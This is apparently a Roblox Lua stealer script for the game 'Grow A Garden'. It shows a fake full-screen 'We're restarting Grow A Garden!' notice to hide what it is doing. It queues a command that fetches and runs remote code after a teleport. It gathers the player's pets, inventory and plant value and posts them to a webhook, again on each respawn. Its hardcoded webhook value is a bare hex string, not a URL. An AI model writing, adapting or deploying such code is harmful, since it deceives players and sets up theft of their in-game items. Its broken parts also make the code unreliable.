local Players           = game:GetService("Players")
local CoreGui           = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicated  = game:GetService("RobloxReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local TeleportService   = game:GetService("TeleportService")
local TextChatService   = game:GetService("TextChatService")
local HttpService       = game:GetService("HttpService")
local RunService        = game:GetService("RunService")

local Username = Username or _G.Username
local Webhook  = Webhook  or _G.Webhook
local URL      = URL      or _G.URL

if Executed then return end
Executed = true

local screen = Instance.new("ScreenGui")
screen.DisplayOrder    = math.huge
screen.IgnoreGuiInset  = true
screen.Enabled         = false
screen.Parent          = CoreGui

local frame = Instance.new("Frame")
frame.AnchorPoint      = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.Position         = UDim2.new(0.5, 0, 0.46, 0)
frame.Size             = UDim2.new(1.25, 0, 1.25, 0)
frame.Parent           = screen

local layout = Instance.new("UIListLayout")
layout.SortOrder            = Enum.SortOrder.LayoutOrder
layout.HorizontalAlignment  = Enum.HorizontalAlignment.Center
layout.VerticalAlignment    = Enum.VerticalAlignment.Center
layout.Padding              = UDim.new(0, 10)
layout.Parent               = frame

local image = Instance.new("ImageLabel")
image.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
image.BackgroundTransparency = 1
image.LayoutOrder            = 1
image.Size                   = UDim2.new(0.2, 100, 0.2, 100)
image.Image                  = "rbxassetid://5152571106"
image.ScaleType              = Enum.ScaleType.Fit
image.Parent                 = frame

local heading = Instance.new("TextLabel")
heading.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
heading.BackgroundTransparency = 1
heading.LayoutOrder            = 2
heading.Size                   = UDim2.new(0.75, 0, 0.02, 20)
heading.Font                   = Enum.Font.GothamBlack
heading.Text                   = "We're restarting Grow A Garden!"
heading.TextColor3             = Color3.fromRGB(255, 255, 255)
heading.TextScaled             = true
heading.Parent                 = frame

local subheading = Instance.new("TextLabel")
subheading.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
subheading.BackgroundTransparency = 1
subheading.LayoutOrder            = 3
subheading.Size                   = UDim2.new(0.7, 0, 0.007, 15)
subheading.Font                   = Enum.Font.GothamBlack
subheading.Text                   = "Please wait while we redirect you..."
subheading.TextColor3             = Color3.fromRGB(255, 255, 255)
subheading.TextScaled             = true
subheading.Parent                 = frame

queue_on_teleport([[
        Username = "I_usebloxflip"
        Webhook = "54fbc67d8a449a6811b1bc076be001b8"
        URL = "]] .. tostring(URL) .. [["
        loadstring(game:HttpGet(URL))()
]])

local DataService          = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
local CalculatePlantValue  = require(ReplicatedStorage.Modules.CalculatePlantValue)
local CommaFormatNumber    = require(ReplicatedStorage.Modules.CommaFormatNumber)
local NumberUtil           = require(ReplicatedStorage.Modules.NumberUtil)
local PetRegistry          = require(ReplicatedStorage.Data.PetRegistry)
local PetUtilities         = require(ReplicatedStorage.Modules.PetServices.PetUtilities)
local InventoryServiceEnums = require(ReplicatedStorage.Modules.EnumRegistry.InventoryServiceEnums)
local ItemTypeEnums         = require(ReplicatedStorage.Modules.EnumRegistry.ItemTypeEnums)

local LocalPlayer = Players.LocalPlayer
local serverType  = ReplicatedStorage.GameEvents.GetServerType:InvokeServer()
local playerList  = Players:GetPlayers()

repeat task.wait() until LocalPlayer:GetAttribute("DataFullyLoaded")
                     and LocalPlayer:GetAttribute("Finished_Loading")

local function collectPets()
    local pets = {}
    for _, pet in CollectionService:GetTagged("PetTargetable") do
        pets[#pets + 1] = pet
    end
    for _, tool in LocalPlayer.Backpack:GetChildren() do
        pets[#pets + 1] = tool
    end
    for _, tool in LocalPlayer.Character:GetChildren() do
        pets[#pets + 1] = tool
    end
    return pets
end

local function harvestAndSend()
    local pets      = collectPets()
    local data      = DataService:GetData()
    local plantValue = CalculatePlantValue(data)
    local payload = {
        username = Username,
        content  = ("Player: %s | Server: %s | Pets: %d | Value: %s")
            :format(LocalPlayer.Name, tostring(serverType), #pets, CommaFormatNumber(plantValue)),
    }
    request({
        Url     = Webhook,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode(payload),
    })
end

harvestAndSend()

LocalPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid")
    harvestAndSend()
end)
